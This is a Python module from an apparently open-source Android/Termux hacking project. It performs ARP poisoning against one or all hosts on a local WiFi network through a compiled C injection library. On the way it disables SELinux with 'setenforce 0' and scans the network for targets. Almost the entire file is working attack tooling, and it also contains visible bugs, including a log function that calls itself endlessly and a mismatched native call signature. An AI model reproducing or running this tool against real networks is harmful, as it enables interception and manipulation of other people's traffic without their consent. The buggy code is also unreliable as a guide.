# Copyright (c) 2026 SugaBlaz
# This software is released under the MIT License.
# https://github.com/SugaBlaz/PRJ_SUGA-27-ANDROID-TERMUX

import os
import subprocess
import socket
import struct
import ctypes
from typing import Optional

import helper.network as network

TERMINAL = None

LIB_FILE_ARP = None
C_FILE_ARP = None
    
def init(terminal):
    global TERMINAL
    TERMINAL = terminal

def log(msg: str):
    """Safely logs to terminal instance or stdout fallback."""
    if TERMINAL and hasattr(TERMINAL, "_log"):
        TERMINAL._log(msg)
    else:
        log(msg, flush=True)
        
def set_dirs(cfilearp, libfilearp):
    global LIB_FILE_ARP, C_FILE_ARP

    C_FILE_ARP, LIB_FILE_ARP = cfilearp, libfilearp
        
class TargetStruct(ctypes.Structure):
    _fields_ = [("ip", ctypes.c_uint32),
                ("mac", ctypes.c_ubyte * 6)]
        
def is_root():
    try: return os.getuid() == 0
    except: return False
    
def ARP_POISON(iface: str, mode: str, target: Optional[int]):
    """
    Launches a ARP POISIONING WiFi attack against a router. (Needs to be connected to the router)
    !! REQUIRES A ROOTED ANDROID !!
    
    iface: The interface you want to use.
    mode: Single or Multi (Multi for all targets, Single for just 1).
    target: If the mode is single, choose the targets number. Else, dont fill the parameter in.
    """
    
    if not is_root():
        log("[-] Your phone is not rooted/this script doesnt have administrator rights.")
        return
    
    needs_recompile = False
    
    if not LIB_FILE_ARP or not os.path.exists(LIB_FILE_ARP):
        needs_recompile = True
    elif os.path.exists(C_FILE_ARP):
        c_mtime = os.path.getmtime(C_FILE_ARP)
        dll_mtime = os.path.getmtime(LIB_FILE_ARP)
        if c_mtime > dll_mtime:  # C code is newer than DLL
            log("[*] Detected changes in fast_packet_arp.c!")
            needs_recompile = True

    if needs_recompile:
        log("[!!] FATAL ERROR: The C HTTP engine is outdated or not compiled. Run download_dependencies() first.")
        return

    interface = iface

    if not network.interface_exists(interface):
        log(f"[-] Error: Network interface '{interface}' does not exist on this device.")
        try:
            available = os.listdir("/sys/class/net/")
            log(f"[!] Active local system hardware paths: {', '.join(available)}")
        except: pass
        return

    log(f"[+] Interface verification successful: Bound to '{interface}'")

    log("[*] Lowering SELinux policy constraints...")
    subprocess.run("setenforce 0")
    
    my_mac = network.get_iface_mac(interface)
    gateway_ip = network.get_gateway_info()
    
    if not gateway_ip or not my_mac:
        log("[-] Error mapping routing gateway table structures.")
        return

    log(f"[*] Resolving Gateway MAC for {gateway_ip}...")
    network.ping_sweeper(gateway_ip)
    gateway_mac = network.get_mac_from_arp(gateway_ip)
    if not gateway_mac:
        log("[-] Gateway address unreachable or unresponsive.")
        return

    targets = network.scan_network(interface, gateway_ip)
    if not targets:
        log("[-] Network sweep returned zero targets.")
        return

    log(f"\n[+] Found {len(targets)} active network nodes:")
    for i, t in enumerate(targets):
        log(f"    {i+1}. {t[0]} ({t[1]})")
    
    log(f"\n[+] Local Profile: {my_mac}")
    log(f"[+] Gateway Profile: {gateway_ip} ({gateway_mac})")
    log("-" * 40)
    
    final_targets = []
    if mode == "Multi":
        final_targets = targets
    else:
        try:
            final_targets = [targets[target]]
        except:
            log("[-] Invalid input choice alignment.")
            return

    TargetArray = TargetStruct * len(final_targets)
    c_targets = TargetArray()
    
    for i, (ip, mac) in enumerate(final_targets):
        packed_ip = struct.unpack("<L", socket.inet_aton(ip))[0]
        c_targets[i].ip = packed_ip
        mac_bytes = bytes(int(b, 16) for b in mac.split(":"))
        for j in range(6):
            c_targets[i].mac[j] = mac_bytes[j]

    lib = ctypes.CDLL(LIB_FILE_ARP)
    lib.start_injection.argtypes = [
        ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p,
        ctypes.POINTER(TargetStruct), ctypes.c_int, ctypes.c_int
    ]
    
    log("\n[+] Native runtime pipeline streaming now... (Press Ctrl+C to instantly break execution)")
    
    try:
        lib.start_injection(
            interface.encode(), 
            gateway_ip.encode(), 
            gateway_mac.encode(), 
            my_mac.encode(),
            c_targets, 
            len(final_targets)
        )
    except KeyboardInterrupt:
        log("\n[+] Script execution gracefully stopped by pipeline request.")